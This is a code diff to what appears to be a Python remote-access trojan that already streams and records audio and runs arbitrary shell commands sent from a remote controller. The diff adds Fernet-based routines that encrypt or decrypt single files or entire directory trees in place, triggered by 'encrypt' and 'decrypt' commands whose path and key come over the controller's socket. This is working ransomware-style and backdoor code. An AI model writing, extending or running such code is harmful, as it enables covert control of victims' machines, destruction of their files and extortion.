@@ -5,6 +5,7 @@ import wave
 
 import pyaudio
 import pyautogui
+from cryptography.fernet import Fernet
 
 
 def infinite_body():
@@ -48,6 +49,43 @@ def infinite_body():
             wf.setframerate(self.RATE)
             wf.writeframes(b''.join(frames))
             wf.close()
+
+    class EncryptDecrypt:
+        def encrypt_file(filename, key):
+            f = Fernet(key)
+            try:
+                with open(filename, "rb") as file:
+                    file_data = file.read()
+                encrypted_data = f.encrypt(file_data)
+                with open(filename, "wb") as file:
+                    file.write(encrypted_data)
+            except:
+                pass
+
+        def decrypt_file(filename, key):
+            f = Fernet(key)
+            try:
+                with open(filename, "rb") as file:
+                    encrypted_data = file.read()
+                decrypted_data = f.decrypt(encrypted_data)
+                with open(filename, "wb") as file:
+                    file.write(decrypted_data)
+            except:
+                pass
+
+        def encrypt_directory(path, key):
+            tree = os.walk(path)
+            for folder in tree:
+                for file in folder[2]:
+                    full_path = os.path.join(folder[0], file)
+                    EncryptDecrypt.encrypt_file(full_path, key)
+
+        def decrypt_directory(path, key):
+            tree = os.walk(path)
+            for folder in tree:
+                for file in folder[2]:
+                    full_path = os.path.join(folder[0], file)
+                    EncryptDecrypt.decrypt_file(full_path, key)
 
     def time_stamp(filename):
         from datetime import datetime
@@ -114,6 +152,38 @@ def infinite_body():
         name = path(name)
         s.send(name.encode())
 
+    def encrypt():
+        path = s.recv(BUFFER_SIZE).decode()
+        key = s.recv(BUFFER_SIZE)
+        ed = EncryptDecrypt
+        if os.path.isfile(path):
+            ed.encrypt_file(path, key)
+            s.send('Completed!'.encode())
+        elif os.path.isdir(path):
+            ed.encrypt_directory(path, key)
+            s.send('Completed!'.encode())
+        else:
+            s.send('Wrong path!'.encode())
+
+    def decrypt():
+        path = s.recv(BUFFER_SIZE).decode()
+        key = s.recv(BUFFER_SIZE)
+        ed = EncryptDecrypt
+        if os.path.isfile(path):
+            ed.decrypt_file(path, key)
+            s.send('Completed!'.encode())
+        elif os.path.isdir(path):
+            ed.decrypt_directory(path, key)
+            s.send('Completed!'.encode())
+        else:
+            s.send('Wrong path!'.encode())
+
+    '''
+    +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+    control module || control module || control module || control module || control module ||
+    +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+    '''
+
     while True:
         command = s.recv(BUFFER_SIZE).decode()
         if command.lower() == 'exit':
@@ -132,6 +202,10 @@ def infinite_body():
             stream_audio()
         elif command.lower() == 'record audio':
             record_audio()
+        elif command.lower() == 'encrypt':
+            encrypt()
+        elif command.lower() == 'decrypt':
+            decrypt()
         else:
             # execute the command and retrieve the results
             output = subprocess.getoutput(command)
